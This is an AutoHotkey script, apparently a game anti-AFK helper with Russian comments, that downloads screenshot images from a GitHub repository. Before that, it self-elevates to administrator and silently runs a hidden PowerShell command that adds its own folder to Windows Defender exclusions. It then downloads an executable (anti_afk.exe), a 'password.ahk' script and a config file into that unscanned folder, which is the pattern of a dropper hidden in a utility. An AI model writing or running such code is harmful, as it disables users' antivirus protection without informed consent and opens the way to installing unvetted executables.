#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir, %A_ScriptDir% ; Ensures a consistent starting directory.
if not A_IsAdmin
{
    Run *RunAs "%A_ScriptFullPath%" ; Перезапускаем скрипт с правами администратора
    ExitApp ; Завершаем текущий процесс
}

; ╔══════════════════════════════════════════════════════════════════════╗
; ║   Данная функция необходима для автоматического добавления папки    ║
; ║   в исключения антивируса Windows Defender. Это нужно, чтобы избежать ║
; ║   ложных срабатываний на программу из-за использования шифрования.  ║
; ║   ⚠ Важно: Для выполнения требуется запуск скрипта от имени Администратора. ║
; ╚══════════════════════════════════════════════════════════════════════╝
; Получаем путь к папке, где находится текущий скрипт
scriptFolder := A_ScriptDir
; Команда PowerShell для добавления папки в исключения Windows Defender
psCommand := "powershell -Command Add-MpPreference -ExclusionPath '" scriptFolder "'"
; Выполняем команду
Run, %psCommand%, , Hide
;════════════════════════════════════════════════════════════════════════════════════════
; Проверка существования папки
IfNotExist, images
{
    ; Создание папки
    FileCreateDir, images
}

ErrorLevel1()
{
    if ErrorLevel = 1
    {
        downloadpixt()
    }
}
downloadpixt()
{
    
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/676.png, images/676.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/7685.png, images/7685.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/832.png, images/832.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/833.png, images/833.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/836.png, images/836.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/837.png, images/837.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/839.png, images/839.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/843.png, images/843.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/846.png, images/846.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/858.png, images/858.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/9896.png, images/9896.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/bonusf10.png, images/bonusf10.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/dostf10.png, images/dostf10.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/eda0.png, images/eda0.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/glosf10.png, images/glosf10.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/goles.png, images/goles.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/loter.png, images/loter.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/pers.png, images/pers.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/persf10.png, images/persf10.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/res2.png, images/res2.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/shopf10.png, images/shopf10.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/test123.png, images/test123.png
    ErrorLevel1()
    UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/zadanf10.png, images/zadanf10.png
    ErrorLevel1()
}
downloadpixt()

UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/anti_afk.exe, anti_afk.exe
UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/9df7136f10f8a8ddb55035bd0f5bd4d2b73b53cd/password.ahk, password.ahk
UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/9df7136f10f8a8ddb55035bd0f5bd4d2b73b53cd/conf.ini, conf.ini